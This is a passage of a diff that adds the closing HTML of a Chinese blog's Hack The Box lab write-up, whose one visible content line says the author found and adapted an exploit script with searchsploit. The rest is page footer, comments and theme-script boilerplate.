+<li>
+<ul>
+<li>使用了kali自带的searchsploit 去找利用脚本，并进行修改利用</li>
+</ul>
+</li>
+</ul></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2022-03-28&#32;17:55:48>更新于 2022-03-28&nbsp;</span>
+      </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/oscp/' class="post-tag">OSCP</a><a href='/tags/htb/' class="post-tag">HTB</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/htb%E9%9D%B6%E6%9C%BA-lame-writeup/" class="post-nav-item" rel="prev" title="HTB靶机 Lame WriteUp"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>HTB靶机 Lame WriteUp</a>
+      <a href="/posts/mac%E4%B8%8Bandroid-app%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/" class="post-nav-item" rel="next" title="Mac下Android APP抓包配置">Mac下Android APP抓包配置<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="XavierRoot/XavierBlog"
+            data-repo-id="R_kgDOHswyxg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOHswyxs4Cd2zm"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="en"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"lunr"},"twemoji":true};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
